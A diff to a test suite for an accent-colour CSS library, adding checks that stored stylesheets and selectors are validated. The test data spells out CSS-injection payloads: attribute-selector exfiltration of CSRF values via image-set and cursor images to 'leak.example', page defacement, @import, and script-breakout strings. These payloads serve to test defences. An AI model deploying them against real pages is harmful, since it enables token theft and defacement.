@@ -241,7 +241,22 @@ describe('invalid input', () => {
 		expect(ground.ok === false && ground.error.code).toBe('invalid-ground');
 		const raised = accentTokens('#e91e8c', { surfaces: { bg: '#fff', raised: 'nope' } });
 		expect(raised.ok === false && raised.error.code).toBe('invalid-ground');
-		for (const selector of ['', '</style><script>', 'a{b:c}', 'a;b', '@import', 'a\\b']) {
+		for (const selector of [
+			'',
+			'</style><script>',
+			'a{b:c}',
+			'a;b',
+			'@import',
+			'a\\b',
+			'a,b',
+			'a\nb',
+			'[a',
+			'a]',
+			'(a',
+			'[a)',
+			"a[b='c]",
+			'a[b="c]'
+		]) {
 			const css = accentCss('#e91e8c', { selector });
 			expect(css.ok === false && css.error.code, selector).toBe('invalid-selector');
 		}
@@ -354,5 +369,145 @@ describe('createAccentScript', () => {
 		expect(() => runInNewContext(createAccentScript('k'), { document, localStorage })).not.toThrow();
 		expect(createAccentScript('</script><script>x')).not.toContain('</script>');
 		expect(createAccentScript('a"b')).toContain('"a\\"b"');
+	});
+});
+
+describe('the head script takes nothing but what accentCss writes', () => {
+	const real = accentCss('#e91e8c');
+	const stylesheet = real.ok ? real.css : '';
+
+	function accepted(stored: string): boolean {
+		const added: unknown[] = [];
+		const document = {
+			createElement: () => ({ id: '', textContent: '' }),
+			head: { appendChild: (el: unknown) => added.push(el) }
+		};
+		runInNewContext(createAccentScript('k'), { document, localStorage: { getItem: () => stored } });
+		return added.length === 1;
+	}
+
+	it('accepts real output: the default, a scoped selector and a role subset', () => {
+		expect(accepted(stylesheet)).toBe(true);
+		const scoped = accentCss('#00aa55', { selector: '.brand [data-x="y"]', roles: ['primary'] });
+		expect(scoped.ok && accepted(scoped.css)).toBe(true);
+		const focus = accentCss('#fff', { roles: ['focus', 'accent'] });
+		expect(focus.ok && accepted(focus.css)).toBe(true);
+	});
+
+	it.each([
+		[
+			'attribute selector with image-set (exfiltration)',
+			`input[name=csrf][value^='a']{background-image:image-set("http:a.leak.example" 1x)}`
+		],
+		['has() selector with a cursor image', `:root:has(input[value^='x']) body{cursor:-webkit-image-set("http:x.leak.example" 1x),auto}`],
+		['defacement with content and display', 'body::before{content:"Session abgelaufen"}*{display:none}'],
+		['a valid rule followed by a foreign one', `${stylesheet}\nbody{display:none}`],
+		['a foreign declaration inside a valid rule', ':root{--k-accent:#e91e8c;background:url(x)}'],
+		['a token that is not an accent token', ':root{--k-bg:#000000}'],
+		['a non-hex value', ':root{--k-accent:red}'],
+		['a custom property with a url', ':root{--k-accent:url(http://x)}'],
+		['a comment', `/* x */${stylesheet}`],
+		['an at-rule', `@import 'x';${stylesheet}`],
+		['a backslash escape', ':root\\{--k-accent:#e91e8c}'],
+		['a newline inside the selector', ':root\n,body{--k-accent:#e91e8c}'],
+		['an empty block', ':root{}'],
+		['no block', ':root']
+	])('rejects %s', (_label, payload) => {
+		expect(accepted(payload)).toBe(false);
+	});
+
+	it('is linear on a long hostile value', () => {
+		const started = Date.now();
+		expect(accepted(':root{--k-accent:#e91e8c;'.repeat(700))).toBe(false);
+		expect(accepted('a'.repeat(19999))).toBe(false);
+		expect(accepted(`${'a'.repeat(19000)}{`)).toBe(false);
+		expect(Date.now() - started).toBeLessThan(1000);
+	});
+
+	it('puts a valid nonce on the style and ignores an invalid one', () => {
+		const run = (nonce: string | undefined): Record<string, string>[] => {
+			const added: Record<string, string>[] = [];
+			const document = {
+				createElement: () => ({}) as Record<string, string>,
+				head: { appendChild: (el: Record<string, string>) => added.push(el) }
+			};
+			runInNewContext(createAccentScript('k', { nonce }), { document, localStorage: { getItem: () => stylesheet } });
+			return added;
+		};
+		expect(run('abc123+/=_-')[0]?.['nonce']).toBe('abc123+/=_-');
+		expect(run(undefined)[0]?.['nonce']).toBeUndefined();
+		expect(run('"></script><script>x')[0]?.['nonce']).toBeUndefined();
+		expect(createAccentScript('k', { nonce: '</script>' })).not.toContain('nonce');
+	});
+});
+
+describe('hardening against untyped callers', () => {
+	const junk: unknown[] = [null, 0, 1, 'x', true, [], {}, () => 1, Symbol('s')];
+
+	it('never throws on odd options', () => {
+		for (const options of junk) {
+			expect(() => accentTokens('#e91e8c', options as never)).not.toThrow();
+			expect(() => accentCss('#e91e8c', options as never)).not.toThrow();
+			expect(() => installAccent('#e91e8c', options as never)).not.toThrow();
+			expect(() => removeAccent(options as never)).not.toThrow();
+			expect(() => createAccentScript('k', options as never)).not.toThrow();
+		}
+		for (const value of junk) {
+			expect(() => accentTokens('#e91e8c', { roles: value as never })).not.toThrow();
+			expect(() => accentTokens('#e91e8c', { surfaces: value as never })).not.toThrow();
+			expect(() => accentTokens('#e91e8c', { theme: value as never, scheme: value as never })).not.toThrow();
+			expect(() => accentCss('#e91e8c', { selector: value as never, roles: value as never })).not.toThrow();
+			expect(() => createAccentScript(value as never)).not.toThrow();
+		}
+	});
+
+	it('treats a missing or odd roles value as "all roles" and null options as none', () => {
+		const all = Object.keys(ok(accentTokens('#e91e8c')).tokens);
+		expect(Object.keys(ok(accentTokens('#e91e8c', null as never)).tokens)).toEqual(all);
+		expect(Object.keys(ok(accentTokens('#e91e8c', { roles: {} as never })).tokens)).toEqual(all);
+		expect(Object.keys(ok(accentTokens('#e91e8c', { roles: 'focus' as never })).tokens)).toEqual(all);
+		expect(Object.keys(ok(accentTokens('#e91e8c', { surfaces: null as never })).tokens)).toEqual(all);
+		const bad = accentTokens('#e91e8c', { surfaces: 5 as never });
+		expect(bad.ok === false && bad.error.code).toBe('invalid-ground');
+		const el = accentCss('#e91e8c', { selector: 5 as never });
+		expect(el.ok === false && el.error.code).toBe('invalid-selector');
+	});
+
+	it('does not echo raw input in error messages beyond 64 characters, and survives a hostile toString', () => {
+		const long = accentTokens('x'.repeat(5000));
+		expect(!long.ok && long.error.message.length).toBeLessThan(120);
+		const quoted = accentTokens('"</script>');
+		expect(!quoted.ok && quoted.error.message).toContain('"\\"</script>"');
+		const hostile = {
+			toString: () => {
+				throw new Error('boom');
+			}
+		};
+		const theme = accentTokens('#e91e8c', { theme: hostile as never });
+		expect(theme.ok).toBe(true);
+		const selector = accentCss('#e91e8c', { selector: hostile as never });
+		expect(selector.ok === false && selector.error.code).toBe('invalid-selector');
+		const unknown = accentTokens('#e91e8c', { theme: 'y'.repeat(500) });
+		expect(!unknown.ok && unknown.error.message.length).toBeLessThan(160);
+	});
+
+	it('refuses a missing element and a foreign document without throwing', () => {
+		const el = { closest: () => null, style: { setProperty: () => undefined, removeProperty: () => '' } };
+		const g = globalThis as { document?: unknown };
+		g.document = {};
+		try {
+			expect(() => applyAccent(null as never, '#e91e8c')).not.toThrow();
+			const missing = applyAccent(null as never, '#e91e8c');
+			expect(missing.ok === false && missing.error.code).toBe('invalid-element');
+			const plain = applyAccent({} as never, '#e91e8c');
+			expect(plain.ok === false && plain.error.code).toBe('invalid-element');
+			expect(() => clearAccent(null as never)).not.toThrow();
+			const doc = installAccent('#e91e8c', { document: {} as never });
+			expect(doc.ok === false && doc.error.code).toBe('no-dom');
+			expect(() => removeAccent({ document: 5 as never })).not.toThrow();
+			expect(() => applyAccent(el as never, '#e91e8c', { computed: false, scheme: 'light' })).not.toThrow();
+		} finally {
+			delete g.document;
+		}
 	});
 });
